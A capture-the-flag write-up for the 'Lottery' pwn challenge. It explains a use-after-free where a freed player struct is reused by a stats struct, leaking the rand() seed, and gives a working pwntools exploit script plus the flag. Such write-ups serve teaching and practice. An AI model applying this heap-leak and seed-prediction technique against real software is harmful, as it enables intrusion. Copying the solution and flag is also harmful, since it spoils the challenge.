# Lottery
```
   .--------------------------------------------.
   |   WELCOME TO YOUR FAVOURITE LOTTERY GAME   |
   | SECURE CODING IS HARD, BUT WE DID OUR BEST |
   |   TO ENSURE A FAIR GAME FOR EVERYONE :)    |
   `--------------------------------------------'
                  /
                 /
         ,---')
        (  -_-(
        ) .__/ )
      _/ _/_( /        _.---._
     (__/ _ _) ,-._   /  o    \
       //)__(\/,-` |_| O  o o O|
   _\\///==o=\'      |O o  o O |
    `-' \    /        \O o   o/
         )___\         `'-.-\\
        / ,\ \       ____)_(____
       / /  \ \     '--..---,,--'
      /()    >()        \\_//
  hfz |\_\   |\_\       /,-.\
                 https://ascii.co.uk/art/lottery
```

## Description

Category : pwn<br>
Points : 482<br>
solves : 3<br>

Secure coding is hard, some bugs are really difficult to find even with the most advanced fuzzing techniques!<br>
Find a way to win the lottery and get the flag.

## Analysis 
This is a lottery game, we need to register to play by guessing a random number, then we can see the stats.
```
.--------- Menu ---------.
| 1. Register            |
| 2. Play                |
| 3. Stats               |
| 4. Unregister          |
| 5. Quit                |
`------------------------'
>>> 1
Enter your age: 23
Enter your gender (male/female): male
Enter your nickname: $hell
Successfully registered.
.--------- Menu ---------.
| 1. Register            |
| 2. Play                |
| 3. Stats               |
| 4. Unregister          |
| 5. Quit                |
`------------------------'
>>> 2
Your guess: 12345
Wrong wrong wrong, WRONG!!
```
I tried decompiling the binary with ida and I arrived to this conclusion.
There are two types of structs (player and stats) that look like this:
```c
typedef struct player {
    int age;
    char gender[16];
    char *nickname;
}player;

typedef struct stats {
    void *next_pointer;
    int round_number;
    int actual_value;
    int your_guess;
}stats;
```
I also found that the seed is a global variable (in .bss section) and since PIE is disabled, its address won't change.<br>
we notice that we can't play without registering, but we can still play if we register then unregister.
This will cause the new stats struct to allocate the same heap (fast-bin) chunck where the player struct used to be. (kinda use-after-free)

## Solution
We can leak the seed by doing the following :<br>
1_ register a player (which will malloc(0x20))<br>
2_ unregister (which will free the allocated player chunck)<br>
3_ play by entering the seed address as our guess (which will reallocate the same memory chunck where player used to be
and our guess will be at the same place in memory where the nickname pointer was)<br>
4_ show stats (it will try to access the players nickname by accessing the pointer at player[3], but in reality it's accessing
stats[3] where the seed's address is)<br>
5_ use the leaked seed to calculate the next "random" number and win the game.<br>

## Exploit
```python
#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL

exe = ELF("./lottery")

context.binary = exe

seed_addr = 0x4040F0

def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("pwn.ctf.microclub.net", 5003)

def register(io, age, gender, name):
    io.sendline('1')
    io.sendline(str(age))
    io.sendline(gender)
    io.sendline(name)

def unregister(io):
    io.sendline('4')

def play(io, guess):
    io.sendline('2')
    io.sendline(str(guess))

def show_stats(io):
    io.recvuntil('>>> ')
    io.sendline('3')
    io.recvuntil('Current player: Mrs. ')
    return int.from_bytes(io.recv(numb=4), "little")

def main():
    r = conn()

    register(r, 22, 'male', 'shell')
    unregister(r)
    play(r, seed_addr)
    seed = (show_stats(r))
    libc = CDLL("libc.so.6")
    libc.srand(seed)
    libc.rand()
    play(r, libc.rand())

    r.interactive()

if __name__ == "__main__":
    main()
```

## Flag
```
shellmates{d4ngl1ng_p01nt3rs_4r3_d4ng3r0us_my_dud3s}
```

[Shellmates's original write-ups](https://github.com/Shellmates/MicroCTF-2021-quals)

